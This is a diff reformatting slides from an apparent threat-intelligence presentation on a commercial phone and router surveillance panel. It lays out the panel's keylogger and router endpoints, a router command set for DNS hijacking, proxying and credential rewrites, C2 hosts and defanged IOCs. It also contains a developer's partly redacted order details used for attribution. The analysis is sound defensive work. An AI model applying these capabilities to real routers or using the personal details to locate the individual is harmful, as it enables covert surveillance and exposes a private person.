@@ -699,59 +824,94 @@ And the split is sloppy: navigation reads mtype, but most component v-if gates s
 
 keylogger.vue  CHUNK 36.js  EVERY KEYLOGGER PATH LIVES UNDER  /windows/*  - EVEN ON A PHONE
 
-mode_nav.vue + keylogger.vue  -  chunks 2.js / 4.js / 36.js // mode_nav.vue - v_is_show()   the branch that creates an eighth platform (os === "linux" || os === "unknown") && linuxMod.includes(href) || this.x_phone_info.mtype === "S13"  && S13Mod.includes(href) `// ← evaluated before iOS` || os === "ios"     && iosMod.includes(href) || os === "ipad" `…` "router" `…` "windows" `…` "mac" `…` "android" // keylogger.vue - the gate that used to single S13 out, now commented out // if (sessionStorage.getItem("os") === "windows" //     || this.x_phone_info.mtype === "S13") { this.v_get_keylogger() } // v-if="!this.x_phone_info.mtype === 'S13'" `← broken precedence: always true` // what ships today - unconditional, every 10 s, on whatever the target is GET /windows/get_keylogger      title | content | hint | time POST  /windows/keylogger_switch   auto-sync, 50 s refresh       cmd 43003 POST  /windows/delete_log         single or batch
+```text
+mode_nav.vue + keylogger.vue  -  chunks 2.js / 4.js / 36.js
+
+// mode_nav.vue - v_is_show()   the branch that creates an eighth platform
+(os === "linux" || os === "unknown") && linuxMod.includes(href)
+|| this.x_phone_info.mtype === "S13"   && S13Mod.includes(href)     // ← evaluated before iOS
+|| os === "ios"      && iosMod.includes(href)
+|| os === "ipad"     …   "router"  …   "windows"  …   "mac"  …   "android"
+
+// keylogger.vue - the gate that used to single S13 out, now commented out
+// if (sessionStorage.getItem("os") === "windows"
+//      || this.x_phone_info.mtype === "S13") { this.v_get_keylogger() }
+// v-if="!this.x_phone_info.mtype === 'S13'"   ← broken precedence: always true
+
+// what ships today - unconditional, every 10 s, on whatever the target is
+GET   /windows/get_keylogger       title | content | hint | time
+POST  /windows/keylogger_switch    auto-sync, 50 s refresh       cmd 43003
+POST  /windows/delete_log          single or batch
+```
 
 ###### **WHAT THE CODE DOES SUPPORT**
 
-**A hardware-profile** flag the backend assigns at registration. v_get_os() can never return “S13” - it only maps client_os. The panel consumes the flag; the builder never emits it. S13Mod's contents are in index.js, and they are exactly Android + keylogger.
+**A hardware-profile** flag the backend assigns at registration.
 
-29
+v_get_os() can never return “S13” - it only maps client_os.
+
+The panel consumes the flag; the builder never emits it.
+
+S13Mod's contents are in index.js, and they are exactly Android + keylogger.
 
 ## Slide 30
 
-**S EC TI ON 3**
+**SECTION 3**
 
 ##### ROUTERS
-
-30
 
 ## Slide 31
 
 ###### ONE ROUTER  =  EVERY DEVICE BEHIND IT
 
-**NO PER-DEVI CE IMPLANT NEEDED  LINKSYS, ASUS, NETGEAR, M IKROTI K**
+**NO PER-DEVICE IMPLANT NEEDED  LINKSYS, ASUS, NETGEAR, MIKROTIK**
 
 ###### **What an infected router means:**
 
-Hijacked DNS Attackers’ Forwarding Attackers’ Proxy Attackers control main and guest WLANs Changed Admin password
+Hijacked DNS
+Attackers’ Forwarding
+Attackers’ Proxy
+Attackers control main and guest WLANs
+Changed Admin password
 
 **Every device behind the NAT, with no endpoint touched, and the owner locked out of his own router.**
 
-- **Why this matters for the threat model** - A router implant is a household-wide or officewide implant. Coverage scales with the number of people behind the NAT, not with the number of devices the operator infected.
+**Why this matters for the threat model**
+
+- A router implant is a household-wide or office-wide implant. Coverage scales with the number of people behind the NAT, not with the number of devices the operator infected.
 
 - It survives phone replacement, factory resets and OS upgrades. It is invisible to every mobile EDR product on the market.
 
-- It is also the cheapest foothold in the catalogue: infect type S7, no model allowlist in the panel, and consumer routers are patched roughly never. -Two live examples follow - a NATO member state and a country in southern Africa, both beaconing to the same Istanbul host.
+- It is also the cheapest foothold in the catalogue: infect type S7, no model allowlist in the panel, and consumer routers are patched roughly never.
 
-31
+- Two live examples follow - a NATO member state and a country in southern Africa, both beaconing to the same Istanbul host.
 
 ## Slide 32
 
 ###### WHAT THE ROUTER IMPLANT CAN BE TOLD TO DO
 
-**THE FULL ROUTER COMMAND SET  4 100 1 – 41 01 5, RECOVERED FROM /c md_ li st**
+**THE FULL ROUTER COMMAND SET  41001–41015, RECOVERED FROM /cmd_list**
 
 **Reconnaissance & control**
 
-Basic hardware info Change credentials Rewrite LAN IP Rewrite WAN IP Change WAN gateway Rewrite DHCP + DNS Read attached USB
+Basic hardware info
+Change credentials
+Rewrite LAN IP
+Rewrite WAN IP
+Change WAN gateway
+Rewrite DHCP + DNS
+Read attached USB
 
 **Interception & redirection**
 
-**Change the DNS servers** for the WAN Configure traffic forwarding Configure the web proxy Toggle the proxy on and off DNS-hijack status  (UI only) Rewrite primary + guest WLAN
+**Change the DNS servers** for the WAN
+Configure traffic forwarding
+Configure the web proxy
+Toggle the proxy on and off
+DNS-hijack status  (UI only)
+Rewrite primary + guest WLAN
 
-- + the shared shell, file and log modules
-
-32
++ the shared shell, file and log modules
 
 ## Slide 33
 
@@ -759,33 +919,52 @@ Basic hardware info Change credentials Rewrite LAN IP Rewrite WAN IP Change WAN 
 
 routerMod = SEVEN TABS  /router/* AND /flow/* REST  41xxx COMMANDS  INFECT TYPE S7  NEW 2026
 
-router_info_detail.vuehijack.vue (39.js)flow.vue (40.js)routerUsb/index.vue (29.js)layout_apk.vue GET /router/base_info        { uid } `→ account,` pwd, hash, LAN, WAN, DHCP, WLAN[] GET /router/get_hijack_status `→ { ip, switch }` POST  /router/send_hijack      { uid, switch, ip } `cmd 41013 → poll 41014 every 3 s, 5 tries` GET /router/usb_info `→ attached + historical, per partition` GET /flow/ `→ WAN/DHCP DNS, proxy config, proxy_switch` POST  /flow/set_proxy          { target_address, target_port, proxy_ip, port } POST  /flow/proxy_switch       on / off             cmd 41011 GET /infect                  { infect_type_list: ["S7"] } `→ build a router implant` POST  /router_login `→ a second front door to the same panel`
+```text
+router_info_detail.vuehijack.vue (39.js)flow.vue (40.js)routerUsb/index.vue (29.js)layout_apk.vue
+
+GET   /router/base_info        { uid }                → account, pwd, hash, LAN, WAN, DHCP, WLAN[]
+GET   /router/get_hijack_status                        → { ip, switch }
+POST  /router/send_hijack      { uid, switch, ip }  cmd 41013 → poll 41014 every 3 s, 5 tries
+GET   /router/usb_info                                 → attached + historical, per partition
+GET   /flow/                                           → WAN/DHCP DNS, proxy config, proxy_switch
+POST  /flow/set_proxy          { target_address, target_port, proxy_ip, port }
+POST  /flow/proxy_switch       on / off              cmd 41011
+GET   /infect                  { infect_type_list: ["S7"] }  → build a router implant
+POST  /router_login                                    → a second front door to the same panel
+```
 
 ###### **THE SEVEN TABS**
 
-###### **phoneinfo   hijack   flow**
+**phoneinfo   hijack   flow**
 
-###### **files   usb   shell   command**
+**files   usb   shell   command**
 
-###### **ABSENT, DELIBERATELY**
+**ABSENT, DELIBERATELY**
 
-Location, contacts, chat, camera, audio, browser, keychain, mail, intranet, screen, keylogger _This is a network-appliance attack surface, not stripped-down phone spyware._
+Location, contacts, chat, camera, audio, browser, keychain, mail, intranet, screen, keylogger
+
+_This is a network-appliance attack surface, not stripped-down phone spyware._
 
 ###### **BRAND-AWARE GATING**
 
-The brand field from /router/base_info is stored in Vuex as show_flow_or_hijack and the nav filters itself. **Linksys** flow hidden, hijack shown **Netgear** both shown **Asus** both shown **anything else** hijack hidden _Vendor-specific firmware handling is a development cost somebody paid for on purpose._
+The brand field from /router/base_info is stored in Vuex as show_flow_or_hijack and the nav filters itself.
+
+**Linksys** flow hidden, hijack shown
+**Netgear** both shown
+**Asus** both shown
+**anything else** hijack hidden
+
+_Vendor-specific firmware handling is a development cost somebody paid for on purpose._
 
 ###### **TWO SEPARATE FRONT DOORS**
 
 POST /router_login is operator authentication, not a login to the victim's router - cookie SSO into sessionStorage.android_sync.
 
-###### **S7  =  ROUTER INFECTED FILE**
+**S7  =  ROUTER INFECTED FILE**
 
 Built from layout_apk.vue with its own tab and its own os:'router' template. No model allowlist anywhere in the builder.
 
 The shell tab has no router branch at all - the gateway gets the same interactive WebSocket shell as a laptop.
-
-33
 
 ## Slide 34
 
@@ -793,11 +972,23 @@ The shell tab has no router branch at all - the gateway gets the same interactiv
 
 router_info_detail.vue  GET /router/base_info  ONE CALL, THE WHOLE PREMISES  NEW 2026
 
-GET /router/base_info  -  the response the operator sees on the phoneinfo tab {
+```text
+GET /router/base_info  -  the response the operator sees on the phoneinfo tab
+{
+    account: { brand, model_name, model_desc, account, pwdhash, guest_state },
+                              ↑ the admin credential, hashed
+    lan:     { ip, netmask, guest_ip, guest_mask },
+    wan:     { ip, mask, default_gateway, type, dns[] },
+    dhcp:    { status, start_ip, end_ip, gateway, guest range, dns[] },
 
-account: { brand, model_name, model_desc, account, pwdhash, guest_state }, `↑ the admin credential, hashed` lan:     { ip, netmask, guest_ip, guest_mask }, wan:     { ip, mask, default_gateway, type, dns[] }, dhcp:    { status, start_ip, end_ip, gateway, guest range, dns[] },
+    wlan: [ { state, type, ssid, password },      // 2.4 GHz
+            { state, type, ssid, password },      // 5 GHz
+            { state, type, ssid, password } ],    // guest
+                              ↑ plaintext. every SSID the box serves.
 
-wlan: [ { state, type, ssid, password },      // 2.4 GHz { state, type, ssid, password },      // 5 GHz { state, type, ssid, password } ],    // guest `↑ plaintext. every SSID the box serves.` stats:   { last_online_time, create_time, count, keep } }
+    stats:   { last_online_time, create_time, count, keep }
+}
+```
 
 ###### **THE WRITE PATH IS STILL IN THERE**
 
@@ -805,51 +996,70 @@ Every LAN / WAN / DHCP / WLAN edit button in the shipped UI is behind
 
 ###### **v-if="0"**
 
-and the account editor is commented out of the template. But the $send_command handlers for 41002 – 41009 are still compiled into the JavaScript.
+and the account editor is commented out of the template. But the $send_command handlers for 41002–41009 are still compiled into the JavaScript.
 
 A build with that gate removed - or a script that calls the handler directly - rewrites the credentials, the DNS, the DHCP pool and both Wi-Fi networks of a device the owner still believes is his.
 
 **_Disabled in the UI is not absent from the product._**
 
-**41002 41006 41008 / 41009** change the admin login and change the DNS servers for rewrite the primary and password the WAN guest WLAN
+**41002** change the admin login and password
+
+**41006** change the DNS servers for the WAN
+
+**41008 / 41009** rewrite the primary and guest WLAN
 
 **41015** read whatever is plugged into the USB port
-
-34
 
 ## Slide 35
 
 ###### ROUTER COMPROMISE DISCOVERY
 
-**CONFIRMED INFECTED ROUT ERS**
+**CONFIRMED INFECTED ROUTERS**
 
-**Router 1  South Africa to Turkish C2** – IP: 102.XXX.XXX.XXX (South Africa) – Port: 57366 (non-standard high port) – Device: MikroTik – Region: Johannesburg **102.XXX.XXX.XXX:57366  to 213[.]250[.]132[.]188:53501** MikroTik device to Huawei Cloud C2 (Istanbul)
+**Router 1  South Africa to Turkish C2**
+– IP: 102.XXX.XXX.XXX (South Africa)
+– Port: 57366 (non-standard high port)
+– Device: MikroTik
+– Region: Johannesburg
+
+**102.XXX.XXX.XXX:57366  to 213[.]250[.]132[.]188:53501**
+MikroTik device to Huawei Cloud C2 (Istanbul)
 
 **Router 2  Czech Republic to Turkish C2**
+– IP: 89.XXX.XXX.XXX (Czech Republic)
+– Port: 8080 (HTTP proxy port)
+– Device: MikroTik
+– Same Turkish infrastructure
 
-– IP: 89.XXX.XXX.XXX (Czech Republic) – Port: 8080 (HTTP proxy port) – Device: MikroTik
-
-– Same Turkish infrastructure **89.XXX.XXX.XXX:8080  to 213[.]250[.]132[.]188:53501** MikroTik device to Huawei Cloud C2 (Istanbul)
-
-35
+**89.XXX.XXX.XXX:8080  to 213[.]250[.]132[.]188:53501**
+MikroTik device to Huawei Cloud C2 (Istanbul)
 
 ## Slide 36
 
 ###### TURKISH C2 INFRASTRUCTURE
 
-**ROUTER OPERATI ONS HUB**
+**ROUTER OPERATIONS HUB**
 
-**Server details Hosting:** Huawei Cloud Istanbul **Host:  ***** [.]compute[.]hwclouds-dns[.]com **ASN:** AS136907 (HUAWEI CLOUDS) **Location:** Istanbul, Türkiye **Time zone:** Europe/Istanbul **Active ports** 53501  HTTPS C2 panel endpoint 52202  HTTP plugin distribution (secondary)
+###### **Server details**
+
+**Hosting:** Huawei Cloud Istanbul
+**Host:** `***[.]compute[.]hwclouds-dns[.]com`
+**ASN:** AS136907 (HUAWEI CLOUDS)
+**Location:** Istanbul, Türkiye
+**Time zone:** Europe/Istanbul
+
+**Active ports**
+
+53501  HTTPS C2 panel endpoint
+52202  HTTP plugin distribution (secondary)
 
 _Dedicated to router-implant management, separate from mobile / desktop C2._
-
-36
 
 ## Slide 37
 
 ###### ROUTER DETECTION & HARDENING
 
-**MIKROTIK -SPECIFIC CHECKS**
+**MIKROTIK-SPECIFIC CHECKS**
 
 ###### **01  Check Scheduled Scripts**
 
@@ -859,45 +1069,37 @@ _Dedicated to router-implant management, separate from mobile / desktop C2._
 
 ###### **04  Out of Band Monitoring and Risk Assessment for External Storages**
 
-37
-
 ## Slide 38
 
-**S EC TI ON 4**
+**SECTION 4**
 
 ##### THE PEOPLE
-
-38
-
-38
 
 ## Slide 39
 
 ###### THE MODULE THAT UNDID THEM
 
-**K F C F O O D - D E LI V E RY D ATA M I NI N G  M O D U L E 1 5 . J S  PA R A L L EL M OD U L E S E X I ST F O R D I DI A N D ME I T U A N**
+**KFC FOOD-DELIVERY DATA MINING  MODULE 15.JS  PARALLEL MODULES EXIST FOR DIDI AND MEITUAN**
 
 ###### **Order Information**
 
 Order ID, completion status, timestamps (placed, completed), total charge in local currency
 
-**Buyer / Victim Information**
+###### **Buyer / Victim Information**
 
 Full name, complete delivery address (home/work), phone number, GPS, city of residence
 
 ###### **Product Details**
 
-###### **Payment Information**
-
 Item names, quantities, prices, product images (80x80px), special instructions
+
+###### **Payment Information**
 
 Payment method (e.g. WXPAY), payment account identifier, transaction number
 
-**Seller Information**
+###### **Seller Information**
 
 Business name (e.g., “KFC”), full business address, phone number, GPS coordinates
-
-39
 
 ## Slide 40
 
@@ -905,27 +1107,43 @@ Business name (e.g., “KFC”), full business address, phone number, GPS coordi
 
 _A real delivery, ordered by a real employee, to a real office - and left in the shipped JavaScript for four and a half years._
 
+```text
 15.js - KFC.vue fixture, verbatim except for the redactions
 
-`…{` order_id:   "1637141665120166855",                     # unix epoch prefix = 17:34:25 CST date_time:  1637141814020,                             # = 2021-11-17  17:36:54  CST name:       "20220211KFC09080Order `（` Takeout `）` ",          # full-width brackets = a Chinese IME seller:             "KFC", seller_address:     "L389, MixC Mall, Xiangge Road, Longgang District, Shenzhen", seller_lat:         22.592283, seller_lng:         114.130707,                        # the mall - verified on the ground goods: [{ name: "A piece of golden crispy chicken", price: 550 }], buyer:              "[REDACTED]",                      # a real surname buyer_phone_number: "+86 157 **** ****",               # a real China Mobile SIM buyer_address:      "[REDACTED], Building 2, Room 301", buyer_city:         "Shenzhen", charge:             26700,                             # ¥267.00 pay_info: { pay_type: "WXPAY", pay_no: "WXISZ10311637141784829159470" }, remark:             "No gloves required" `}…`
+…{
+  order_id:   "1637141665120166855",                     # unix epoch prefix = 17:34:25 CST
+  date_time:  1637141814020,                             # = 2021-11-17  17:36:54  CST
+  name:       "20220211KFC09080Order（Takeout） ",          # full-width brackets = a Chinese IME
 
-40
+  seller:             "KFC",
+  seller_address:     "L389, MixC Mall, Xiangge Road, Longgang District, Shenzhen",
+  seller_lat:         22.592283,
+  seller_lng:         114.130707,                        # the mall - verified on the ground
+
+  goods: [{ name: "A piece of golden crispy chicken", price: 550 }],
+  buyer:              "[REDACTED]",                      # a real surname
+  buyer_phone_number: "+86 157 **** ****",               # a real China Mobile SIM
+  buyer_address:      "[REDACTED], Building 2, Room 301",
+  buyer_city:         "Shenzhen",
+  charge:             26700,                             # ¥267.00
+  pay_info: { pay_type: "WXPAY", pay_no: "WXISZ10311637141784829159470" },
+  remark:             "No gloves required"
+}…
+```
 
 ## Slide 41
 
-**P E DE S T R IA N R OU T E - 6 3 1 M S T RA I G H T L I N E , 8 0 0 M O N F O OT, A B O UT T E N M I N U T ES**
-
 ###### THE OFFICE AND THE CHICKEN
 
-The seller coordinates in the fixture resolve to a real KFC on the third floor of a shopping mall. The delivery address resolves to a converted industrial building. Location detail redacted for this slide.
+**PEDESTRIAN ROUTE - 631 M STRAIGHT LINE, 800 M ON FOOT, ABOUT TEN MINUTES**
 
-41
+The seller coordinates in the fixture resolve to a real KFC on the third floor of a shopping mall. The delivery address resolves to a converted industrial building. Location detail redacted for this slide.
 
 ## Slide 42
 
 ###### THE DEVELOPER
 
-**ONE RECEI PT, FOUR PIVOTS**
+**ONE RECEIPT, FOUR PIVOTS**
 
 ###### **01  What the receipt gave us**
 
@@ -933,7 +1151,9 @@ The seller coordinates in the fixture resolve to a real KFC on the third floor o
 
 - A delivery address: Building 2, Room 301
 
-- A surname, a city, a WeChat Pay txn ID - 17 November 2021, 17:36 China time
+- A surname, a city, a WeChat Pay txn ID
+
+- 17 November 2021, 17:36 China time
 
 ###### **02  What the number resolved to**
 
@@ -967,39 +1187,39 @@ The seller coordinates in the fixture resolve to a real KFC on the third floor o
 
 He ordered a piece of golden crispy chicken to the office, and the order object stayed in the shipped JavaScript for four and a half years. That is the whole pivot. Everything after this slide - the company, the ownership, the software portfolio - hangs off one man's dinner.
 
-42
-
 ## Slide 43
 
 ###### THE CODEBASE SWITCHED LANGUAGE
 
 ###### **What we expected to find**
 
-- Build path E:/xiangmu/ - 项目, “project”
+–Build path E:/xiangmu/ - 项目, “project”
 
-- Gaode / Amap maps, GCJ-02 coordinates
+–Gaode / Amap maps, GCJ-02 coordinates
 
-- China Standard Time throughout
+–China Standard Time throughout
 
-- Simplified Chinese operator strings
+–Simplified Chinese operator strings
 
-**What the panel actually shows**
+###### **What the panel actually shows**
 
-- Every operator string in English
+–Every operator string in English
 
-–“refresh” “Synchronous Data” “search…” –Command labels: “Destruction terminals”, –“Telephony server sabotage”, “boot sector cracking”
+–“refresh” “Synchronous Data” “search…”
 
-**Why this is the commercial signal**
+–Command labels: “Destruction terminals”,
 
-- Nobody localizes an in-house tool
+–“Telephony server sabotage”, “boot sector cracking”
 
-- English UI + is_test demo + bill flag
+###### **Why this is the commercial signal**
 
-- + white-label csm208 / csm210 brands
+–Nobody localizes an in-house tool
 
-- = a product being sold across a language border
+–English UI + is_test demo + bill flag
 
-43
+–+ white-label csm208 / csm210 brands
+
+–= a product being sold across a language border
 
 ## Slide 44
 
@@ -1007,43 +1227,84 @@ He ordered a piece of golden crispy chicken to the office, and the order object 
 
 WEBPACK NEVER STRIPPED THE SOURCE MAPS - SO EVERY BUNDLE NAMES THE WORKSTATION IT WAS BUILT ON  NEW 2026
 
+```text
 inline source maps, preserved across all 56 webpack chunks  -  IOC I-20
 
-// our capture - panel at 213[.]250[.]132[.]188:53501/ujmfanncy76211/  androidSync v3.5.0 "sources": [ "E:/xiangmu/androidSync/main_front/src `/components/chat/…" ] ↑` xiangmu = 项目 `, “project”      ↑ repo:` main_front // a second sample, reported elsewhere - NOT present in our dump "sources": [ "D:/project/azyk/androidsync-front/src `/…" ] ↑ English root   ↑ handle?   ↑ repo:` androidsync-front
+// our capture - panel at 213[.]250[.]132[.]188:53501/ujmfanncy76211/  androidSync v3.5.0
+"sources": [ "E:/xiangmu/androidSync/main_front/src/components/chat/…" ]
+                ↑ xiangmu = 项目, “project”        ↑ repo: main_front
 
-###### **E:  vs  D: xiangmu  vs  project DIFFERENT DRIVE DIFFERENT ROOT**
+// a second sample, reported elsewhere - NOT present in our dump
+"sources": [ "D:/project/azyk/androidsync-front/src/…" ]
+                ↑ English root    ↑ handle?    ↑ repo: androidsync-front
+```
 
-One developer names his working root in Chinese. The other names it in English. Same word, two habits.
+###### **E:  vs  D:**
+
+**DIFFERENT DRIVE**
 
 Webpack writes the absolute path of whoever compiled the bundle. Two drive letters means two filesystems.
 
-###### **main_front  vs androidsync-front DIFFERENT REPO NAME**
+###### **xiangmu  vs  project**
+
+**DIFFERENT ROOT**
+
+One developer names his working root in Chinese. The other names it in English. Same word, two habits.
+
+###### **main_front  vs  androidsync-front**
+
+**DIFFERENT REPO NAME**
 
 Either the frontend was renamed between releases, or a second checkout is maintained under its own name.
 
-**Provenance, stated plainly:** E: /xiangmu /androidSync/main_front/ D: /project/azyk /androidsync-front/ The floor for this build team is two workstations
+**Provenance, stated plainly:**
 
-44
+E:/xiangmu/androidSync/main_front/
+D:/project/azyk/androidsync-front/
+The floor for this build team is two workstations
 
 ## Slide 45
 
-**C O R PO R AT E R E C OR D - A N O NY M IS E D FO R T H IS P R ES E N TAT IO N**
-
 ###### THE COMPANY BEHIND THE ADDRESS
 
-Founded May 2020 by two shareholders. Ownership transferred in February 2023 - fifteen months after the lunch order. Eighteen insured employees, annual filings up to date, zero subsidiaries. A real, tax-paying, eighteen-person software company.
+**CORPORATE RECORD - ANONYMISED FOR THIS PRESENTATION**
 
-45
+Founded May 2020 by two shareholders. Ownership transferred in February 2023 - fifteen months after the lunch order. Eighteen insured employees, annual filings up to date, zero subsidiaries. A real, tax-paying, eighteen-person software company.
 
 ## Slide 46
 
 ###### SEVENTEEN REGISTERED SOFTWARE COPYRIGHTS
 
-**W H AT T H E CO M PAN Y TE L LS IT S O W N G O V ER N M E N T I T B U IL D S**
+**WHAT THE COMPANY TELLS ITS OWN GOVERNMENT IT BUILDS**
+
+**REGISTERED SOFTWARE — 17 COPYRIGHTS (EN TITLES)**
+
+**2022:**
+- Secure Internet Access Channel Software
+
+**2023:**
+- Encrypted Data Transmission System
+- Windows Host Password Recovery System
+- Full-Process Data Management Platform
+- Social Account Automation Management Platform
+
+**2024:**
+- Secure Chat Software
+- Android Forensics System
+- iOS Forensics Software
+- Email Correlation Analysis System
+- Automated Summary Extraction System
+- Automated File Analysis System
+- Mobile Terminal Acquisition System
+
+**2025:**
+- Device Terminal Detection System
+- Threat & Attack Detection System
+- Encrypted Document Cracking System
+- Android Phone Interception System
+- Cloud-Intelligence All-Domain Information Aggregation & Analysis System
 
 Filed with the state registry between 2022 and 2025. Read the 2025 column: Android Phone Interception System. Encrypted Document Cracking System. The panel's internal project name is androidSync. That is the same product, described twice.
-
-46
 
 ## Slide 47
 
@@ -1055,59 +1316,56 @@ Observed activity: Monday-Friday, 09:00-18:00. Panel offline Friday 17:00 throug
 
 Mon Tue Wed Thu Fri Sat Sun
 
-_“That shows the operator behind it is a salary - paid clerk working for a government agency.”_
-
-47
+_“That shows the operator behind it is a salary-paid clerk working for a government agency.”_
 
 ## Slide 48
 
 ###### GEOGRAPHIC ATTRIBUTION SIGNALS
 
-**CHINESE MAPPI NG -SERVICE I NT EGRATI ON**
+**CHINESE MAPPING-SERVICE INTEGRATION**
 
-**AutoNavi / Amap (** `高德地` **图 )** API calls to webapi.amap.com detected from operator browsers. AutoNavi is a Chinese mapping & geolocation service owned by Alibaba. **Why Amap?**
+###### **AutoNavi / Amap (高德地图)**
 
-- **Exclusive to China** primarily functional within
+API calls to webapi.amap.com detected from operator browsers. AutoNavi is a Chinese mapping & geolocation service owned by Alibaba.
 
-- the mainland
+###### **Why Amap?**
 
-- **Language** interface & metadata strictly
+- **Exclusive to China**  primarily functional within the mainland
 
-- Simplified Chinese
+- **Language**  interface & metadata strictly Simplified Chinese
 
-- **Alternatives ignored** Google Maps /
-
-- OpenStreetMap bypassed
+- **Alternatives ignored**  Google Maps / OpenStreetMap bypassed
 
 ###### **Attribution weight:  HIGH**
 
-Strong indicator of Chinese-speaking threat operators physically based in mainland China. Usage: real-time victim location, WGS- 84 → GCJ -02 coordinate conversion, Chinese-address geocoding.
-
-48
+Strong indicator of Chinese-speaking threat operators physically based in mainland China. Usage: real-time victim location, WGS-84 → GCJ-02 coordinate conversion, Chinese-address geocoding.
 
 ## Slide 49
 
-TECHNOLOGY COMPANY _Description of the company registered at this address_ `“The company has gathered a group of top` -notch system development engineers who are committed to the research and development of new technologies and constantly innovate. We strive to stay at the forefront of technology and do better. Currently, our clients are located throughout China, including enterprises, government agencies, the military, and schools. Excellent after-sales service and strong ~~technical support have won unanimous praise from~~ `our clients.”`
+###### TECHNOLOGY COMPANY
 
-49
+_Description of the company registered at this address_
+
+“The company has gathered a group of top-notch system development engineers who are committed to the research and development of new technologies and constantly innovate. We strive to stay at the forefront of technology and do better. Currently, our clients are located throughout China, **including enterprises, government agencies, the military, and schools.** Excellent after-sales service and strong technical support have won unanimous praise from our clients.”
 
 ## Slide 50
 
-###### MULTI-TIER RBAC = COMMERCIAL PRODUCT
-
-###### **NEW 2026**
+###### MULTI-TIER RBAC = COMMERCIAL PRODUCT **NEW 2026**
 
 **THE PANEL HAS A DEMO MODE**
 
-**TIER 0 - is_test (demo/review) READ-ONLY. A prospect can browse intercepted data but cannot export it: audio player nodownload, batch + per-row download hidden.**
+**TIER 0 - is_test (demo/review)**
+READ-ONLY. A prospect can browse intercepted data but cannot export it: audio player nodownload, batch + per-row download hidden.
 
-**TIER 2 - bill = true (paying) Full-feature operator. Unlocks WeChat voice recording and premium plugins. The build-side flag is literally named for billing.**
+**TIER 2 - bill = true (paying)**
+Full-feature operator. Unlocks WeChat voice recording and premium plugins. The build-side flag is literally named for billing.
 
-**TIER 3 - super-admin Customer-org admin: IP allowlist, web config, testAPK registry, log deleteall.**
+**TIER 3 - super-admin**
+Customer-org admin: IP allowlist, web config, test-APK registry, log delete-all.
 
-**Free trial to paid to enterprise - in a surveillance panel. is_test + bill + per-customer csm208 brands are the strongest single signal of the contractor / SaaS model from the panel side.**
+**Free trial to paid to enterprise - in a surveillance panel.**
 
-50
+is_test + bill + per-customer csm208 brands are the strongest single signal of the contractor / SaaS model from the panel side.
 
 ## Slide 51
 
@@ -1130,13 +1388,11 @@ TECHNOLOGY COMPANY _Description of the company registered at this address_ `“T
 
 _Each customer gets a different capabilities list. It’s based on a subscription model._
 
-51
-
 ## Slide 52
 
 ###### COMMERCIALIZATION EVIDENCE
 
-**FOUR INDEPENDENT SIGNAL S, NONE OF THEM INFERRED FROM TELEMETRY**
+**FOUR INDEPENDENT SIGNALS, NONE OF THEM INFERRED FROM TELEMETRY**
 
 ###### 1   A price list, in the source
 
@@ -1150,23 +1406,17 @@ Guest B hands out per-UID tokens: a reseller channel.
 
 ###### 3   Localized for export
 
-###### 4   Per-customer builds and a registry portfolio
-
 The whole operator UI was translated from Chinese into English, IME artefacts and all. You do not localize a tool your own team is the only user of.
+
+###### 4   Per-customer builds and a registry portfolio
 
 MyConfig.* flags are compiled in, not set per session - different customers run different bundles. And the company registers its work with the state: seventeen software copyrights, including an Android phone interception system.
 
-52
-
 ## Slide 53
 
-**S EC TI ON 5**
+**SECTION 5**
 
 ##### DEFENSE
-
-53
-
-53
 
 ## Slide 54
 
@@ -1174,92 +1424,172 @@ MyConfig.* flags are compiled in, not set per session - different customers run 
 
 ###### **Domains  35 distinct hostnames on one certificate cluster**
 
-adams-support[.]com apis[.]chatsupport[.]work etisalatphone[.]cloud foldnova[.]xyz getsmscloud[.]io kbohandelsregister[.]25u[.]com kbohandelsregister[.]4dq[.]com kbohandelsregister[.]4pu[.]com m[.]xiaomivideo[.]com mangomu[.]com miphone[.]space miphonemix[.]xyz phoneforjazz[.]com phoneonline[.]top phonexity[.]xyz ritmo-vivo[.]com roshanphone[.]cloud s[.]xiaomishopstore[.]com samgalax[.]xyz
+adams-support[.]com
+apis[.]chatsupport[.]work
+etisalatphone[.]cloud
+foldnova[.]xyz
+getsmscloud[.]io
+kbohandelsregister[.]25u[.]com
+kbohandelsregister[.]4dq[.]com
+kbohandelsregister[.]4pu[.]com
+m[.]xiaomivideo[.]com
+mangomu[.]com
+miphone[.]space
+miphonemix[.]xyz
+phoneforjazz[.]com
+phoneonline[.]top
+phonexity[.]xyz
+ritmo-vivo[.]com
+roshanphone[.]cloud
+s[.]xiaomishopstore[.]com
+samgalax[.]xyz
 
-samroms[.]top samsunggadget[.]shop samsunginfotech[.]com sansx-lifeovoi[.]xyz shad[.]fureyu[.]com spaceskd[.]com testjava19[.]com turkcellphone[.]com vorlaxiq[.]com www[.]thereforethetree[.]com www[.]kbohandelsregister[.]25u[.]com www[.]kbohandelsregister[.]4dq[.]com www[.]kbohandelsregister[.]4pu[.]com www[.]messager[.]cloud www[.]ritmo-vivo[.]com www[.]operationsharetools[.]com www[.]sunrisefromthesea[.]com www[.]routerconfigonline[.]com yyccloud[.]com yycclouds[.]com
-
-54
+samroms[.]top
+samsunggadget[.]shop
+samsunginfotech[.]com
+sansx-lifeovoi[.]xyz
+shad[.]fureyu[.]com
+spaceskd[.]com
+testjava19[.]com
+turkcellphone[.]com
+vorlaxiq[.]com
+www[.]thereforethetree[.]com
+www[.]kbohandelsregister[.]25u[.]com
+www[.]kbohandelsregister[.]4dq[.]com
+www[.]kbohandelsregister[.]4pu[.]com
+www[.]messager[.]cloud
+www[.]ritmo-vivo[.]com
+www[.]operationsharetools[.]com
+www[.]sunrisefromthesea[.]com
+www[.]routerconfigonline[.]com
+yyccloud[.]com
+yycclouds[.]com
 
 ## Slide 55
 
 ###### NETWORK INDICATORS **IP Addresses**
 
-|15[.]164[.]214[.]40
+15[.]164[.]214[.]40
 18[.]141[.]143[.]255
 27[.]124[.]37[.]30
-27[.]124[.]37[.]59|47[.]76[.]150[.]84
-47[.]79[.]149[.]19
-47[.]92[.]141[.]231
-47[.]92[.]168[.]159|103[.]43[.]16[.]82
-103[.]43[.]17[.]53
-103[.]43[.]17[.]99
-103[.]43[.]18[.]95|119[.]147[.]213[.]48
-120[.]24[.]250[.]220
-120[.]55[.]51[.]191
-121[.]196[.]234[.]241|185[.]195[.]66[.]75
-185[.]195[.]66[.]86
-185[.]198[.]58[.]30
-192[.]142[.]45[.]238|
-|---|---|---|---|---|
-|27[.]124[.]37[.]64|47[.]96[.]148[.]5|103[.]43[.]19[.]64|121[.]201[.]109[.]98|193[.]56[.]255[.]191|
-|38[.]54[.]79[.]250
-43[.]103[.]49[.]61|47[.]98[.]243[.]165
